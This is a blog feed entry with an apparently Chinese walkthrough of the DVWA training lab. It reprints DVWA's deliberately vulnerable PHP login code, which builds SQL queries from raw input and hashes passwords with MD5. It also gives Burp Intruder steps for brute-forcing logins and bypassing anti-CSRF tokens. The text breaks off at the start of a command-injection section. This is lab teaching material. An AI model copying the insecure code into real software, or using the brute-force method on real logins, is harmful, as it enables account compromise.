{
    "version": "https://jsonfeed.org/version/1",
    "title": "千里稻花应秀色 • All posts by \"安全\" tag",
    "description": "blogs by SSR",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2021/04/15/%E5%AE%89%E5%85%A8/DVWA/",
            "url": "http://example.com/2021/04/15/%E5%AE%89%E5%85%A8/DVWA/",
            "title": "DVWA通关手册",
            "date_published": "2021-04-15T03:40:59.000Z",
            "content_html": "<h1 id=\"dvwa通关手册\"><a class=\"markdownIt-Anchor\" href=\"#dvwa通关手册\">#</a> DVWA 通关手册</h1>\n<h2 id=\"brute-force\"><a class=\"markdownIt-Anchor\" href=\"#brute-force\">#</a> Brute Force</h2>\n<p>登录界面</p>\n<h2 id=\"image-20210425163130153\"><a class=\"markdownIt-Anchor\" href=\"#image-20210425163130153\">#</a> <img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163130153.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425163130153\"></h2>\n<h3 id=\"low\"><a class=\"markdownIt-Anchor\" href=\"#low\">#</a> Low</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Get username</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Get password</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>使用 Burp Suit 抓包</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163429574.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425163429574\"></p>\n</li>\n<li>\n<p>Send to intruder</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163500449.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425163500449\"></p>\n</li>\n<li>\n<p>选择密码位置</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425163605602.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425163605602\"></p>\n</li>\n<li>\n<p>上字典</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425164245642.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425164245642\"></p>\n</li>\n<li>\n<p>根据返回长度判断正确密码</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425171021802.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425171021802\"></p>\n</li>\n</ul>\n<h3 id=\"medium\"><a class=\"markdownIt-Anchor\" href=\"#medium\">#</a> Medium</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Sanitise username input</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$user</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check the database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        sleep( <span class=\"number\">2</span> );</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>加入了参数的判断，防止部分 SQL 注入，加入 sleep (2)</li>\n<li>没有防爆破机制，操作同 Low 等级</li>\n</ul>\n<h3 id=\"high\"><a class=\"markdownIt-Anchor\" href=\"#high\">#</a> High</h3>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;Login&#x27;</span> ] ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span class=\"string\">&#x27;session_token&#x27;</span> ], <span class=\"string\">&#x27;index.php&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise username input</span></span><br><span class=\"line\">    <span class=\"variable\">$user</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;username&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = stripslashes( <span class=\"variable\">$user</span> );</span><br><span class=\"line\">    <span class=\"variable\">$user</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$user</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Sanitise password input</span></span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = <span class=\"variable\">$_GET</span>[ <span class=\"string\">&#x27;password&#x27;</span> ];</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = stripslashes( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = ((<span class=\"keyword\">isset</span>(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) &amp;&amp; is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_real_escape_string(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$pass</span> ) : ((trigger_error(<span class=\"string\">&quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.&quot;</span>, E_USER_ERROR)) ? <span class=\"string\">&quot;&quot;</span> : <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">    <span class=\"variable\">$pass</span> = md5( <span class=\"variable\">$pass</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// Check database</span></span><br><span class=\"line\">    <span class=\"variable\">$query</span>  = <span class=\"string\">&quot;SELECT * FROM `users` WHERE user = &#x27;<span class=\"subst\">$user</span>&#x27; AND password = &#x27;<span class=\"subst\">$pass</span>&#x27;;&quot;</span>;</span><br><span class=\"line\">    <span class=\"variable\">$result</span> = mysqli_query(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>],  <span class=\"variable\">$query</span> ) <span class=\"keyword\">or</span> <span class=\"keyword\">die</span>( <span class=\"string\">&#x27;&lt;pre&gt;&#x27;</span> . ((is_object(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>])) ? mysqli_error(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]) : ((<span class=\"variable\">$___mysqli_res</span> = mysqli_connect_error()) ? <span class=\"variable\">$___mysqli_res</span> : <span class=\"literal\">false</span>)) . <span class=\"string\">&#x27;&lt;/pre&gt;&#x27;</span> );</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">if</span>( <span class=\"variable\">$result</span> &amp;&amp; mysqli_num_rows( <span class=\"variable\">$result</span> ) == <span class=\"number\">1</span> ) &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Get users details</span></span><br><span class=\"line\">        <span class=\"variable\">$row</span>    = mysqli_fetch_assoc( <span class=\"variable\">$result</span> );</span><br><span class=\"line\">        <span class=\"variable\">$avatar</span> = <span class=\"variable\">$row</span>[<span class=\"string\">&quot;avatar&quot;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">// Login successful</span></span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;p&gt;Welcome to the password protected area <span class=\"subst\">&#123;$user&#125;</span>&lt;/p&gt;&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;img src=\\&quot;<span class=\"subst\">&#123;$avatar&#125;</span>\\&quot; /&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">        <span class=\"comment\">// Login failed</span></span><br><span class=\"line\">        sleep( rand( <span class=\"number\">0</span>, <span class=\"number\">3</span> ) );</span><br><span class=\"line\">        <span class=\"keyword\">echo</span> <span class=\"string\">&quot;&lt;pre&gt;&lt;br /&gt;Username and/or password incorrect.&lt;/pre&gt;&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    ((is_null(<span class=\"variable\">$___mysqli_res</span> = mysqli_close(<span class=\"variable\">$GLOBALS</span>[<span class=\"string\">&quot;___mysqli_ston&quot;</span>]))) ? <span class=\"literal\">false</span> : <span class=\"variable\">$___mysqli_res</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">// Generate Anti-CSRF token</span></span><br><span class=\"line\">generateSessionToken();</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">?&gt;</span> </span><br></pre></td></tr></table></figure>\n<ul>\n<li>\n<p>加入 Anti-CSRF token 机制，验证本次请求中是否包含上一个回应中的 token</p>\n</li>\n<li>\n<p>抓包分析</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174153220.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425174153220\"></p>\n</li>\n<li>\n<p>Send to intruder，选择 position，两个爆破位应使用 Pitchfork 模式</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174257108.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425174257108\"></p>\n</li>\n<li>\n<p>option 中选择 Grep-Extract，添加回应包中的 token 值</p>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425174734492.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425174734492\"></p>\n</li>\n<li>\n<p>第一个位置应用字典，第二个位置应用 grep 内容，并初始化 token 值</p>\n</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175021711.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425175021711\"></p>\n<ul>\n<li>Start attack，一样看长度</li>\n</ul>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175428340.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425175428340\"></p>\n<hr>\n<h2 id=\"command-injection\"><a class=\"markdownIt-Anchor\" href=\"#command-injection\">#</a> Command Injection</h2>\n<p><img \"\" class=\"lazyload placeholder\" data-original=\"C:%5CUsers%5CSSR%5CAppData%5CRoaming%5CTypora%5Ctypora-user-images%5Cimage-20210425175815201.png\" src=\"https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif\" alt=\"image-20210425175815201\"></p>\n<p>源码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Command Injection</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#Impossible Command Injection Source</span></span><br><span class=\"line\"><span class=\"meta\">&lt;?php</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">if</span>( <span class=\"keyword\">isset</span>( <span class=\"variable\">$_POST</span>[ <span class=\"string\">&#x27;Submit&#x27;</span> ]  ) ) &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Check Anti-CSRF token</span></span><br><span class=\"line\">    checkToken( <span class=\"variable\">$_REQUEST</span>[ <span class=\"string\">&#x27;user_token&#x27;</span> ], <span class=\"variable\">$_SESSION</span>[ <span 